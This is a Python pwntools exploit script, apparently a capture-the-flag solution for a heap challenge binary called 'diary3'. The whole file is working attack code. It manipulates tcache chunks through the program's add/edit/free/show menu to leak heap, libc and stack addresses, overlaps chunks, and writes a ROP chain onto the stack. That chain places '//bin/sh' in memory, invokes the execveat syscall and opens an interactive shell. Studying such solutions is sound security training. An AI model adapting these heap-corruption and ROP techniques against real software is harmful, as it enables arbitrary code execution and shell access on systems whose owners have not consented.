#!/usr/bin/python
from pwn import *
import random
import string
import time
from struct import *

# Author: xct
context.arch = 'amd64'
context.terminal = ['alacritty', '-e', 'zsh', '-c']

def add(size, data=""):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.sendline(data)


def edit(index, data):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('data: ')
    p.sendline(data)


def show(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('index: ')
    p.sendline(str(index))


def free(index):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(index))


libc = ELF('./libc.so.6')
main = ELF('./diary3')

#p = remote(host='', port=,level='debug')
p = process('./diary3', level='debug')

for i in range(7):
  add(0xf0)
for i in range(7):
  free(i)
for i in range(7):
  add(0x128)
for i in range(7):
  free(i)
add(0x128, 'A'*0x128)
add(0x118, 'B'*0x118)
add(0x118, (b"C"*0xF8)+p64(0x21)+p64(0)+p64(0)+p64(0))

free(0)
add(0x128)
show(0)
p.recvuntil (": ") 
leak_addr = u64(p.recvn(6).ljust (8 , b'\x00'))
leak_offset = 0x1D6 # remote -0x40
fake_header = leak_addr + leak_offset # remote -0x10
free(0)


add(0x128, p64(0)+p64(0x241)+p64(fake_header)+p64(fake_header))
for i in range(0x118-2, 0x118-9, -1):
    edit(1, 'B'*i + '\x40\x02')
free(2) # C

add(0x110)
show(1)
p.recvuntil (": ")
main_arena = u64(p.recvn(6).ljust (8 , b'\x00'))
libc_base = main_arena - 0x1E4CA0
malloc_hook = libc_base + 0x1E4C30 
libc_environ = libc_base + 0x1E7D60 
free(0)

for i in range(7):
    add(0x128) # 2 - 9
add(0x128)

# leak stack
free(8)
free(9)
for i in range(8-2, 8-9, -1):
    edit(1, b'B'*i + p64(libc_environ)[:6])
add(0x128, "A"*8) 
add(0x128)
show(9)
p.recvuntil (": ") 
stack_leak = u64(p.recvn(6).ljust (8 , b'\x00'))
rop_loc = stack_leak - 0xf2

ropnop = p64(libc_base + 0x000000000003148f)
rop = b""
rop += ropnop
rop += ropnop
rop += p64(libc_base + (0x0000000000030e4d)) # 0x0000000000030e4d: pop r12; ret;
rop += b'//bin/sh'
rop += p64(libc_base + (0x0000000000026a25)) # 0x0000000000026a25: pop r13; ret;
rop += p64(libc_base + (0x00000000001e41a0))
rop += p64(libc_base + (0x00000000000a0da8)) # 0x00000000000a0da8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(libc_base + (0x0000000000030e4d)) # 0x0000000000030e4d: pop r12; ret;
rop += p64(0x0000000000000000)
rop += p64(libc_base + (0x0000000000026a25)) # 0x0000000000026a25: pop r13; ret;
rop += p64(libc_base + (0x00000000001e41a8))
rop += p64(libc_base + (0x00000000000a0da8)) # 0x00000000000a0da8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(libc_base + (0x0000000000026542)) # 0x0000000000026542: pop rdi; ret;
rop += p64(0)
rop += p64(libc_base + (0x0000000000026f9e)) # 0x0000000000026f9e: pop rsi; ret;
rop += p64(libc_base + (0x00000000001e41a0))
rop += p64(libc_base + (0x000000000012bda6)) # 0x000000000012bda6: pop rdx; ret;
rop += p64(0)
rop += p64(libc_base + (0x000000000012bda5))  # pop r10; ret;
rop += p64(0)
rop += p64(libc_base + (0x000000000010b31e))  # pop rcx; ret;
rop += p64(0)
rop += p64(libc_base + (0x0000000000047cf8)) # 0x0000000000047cf8: pop rax; ret;
rop += p64(0x142)
rop += p64(libc_base + (0x00000000000cf6c5)) # 0x00000000000cf6c5: syscall; ret;

# write rop chain to stack
free(7)
free(8)
for i in range(8-2, 8-9, -1):
    edit(1, b'X'*i + p64(rop_loc)[:6]) 
add(0x128, "A"*8) 
add(0x128, rop)

log.success(f'HeapLeak: {hex(leak_addr)}')
log.success(f'LibcLeak: {hex(main_arena)}')
log.success(f'LibcBase: {hex(libc_base)}')
log.success(f'StackLeak: {hex(stack_leak)}')
log.success(f'RSP: {hex(rop_loc)}')

p.interactive()
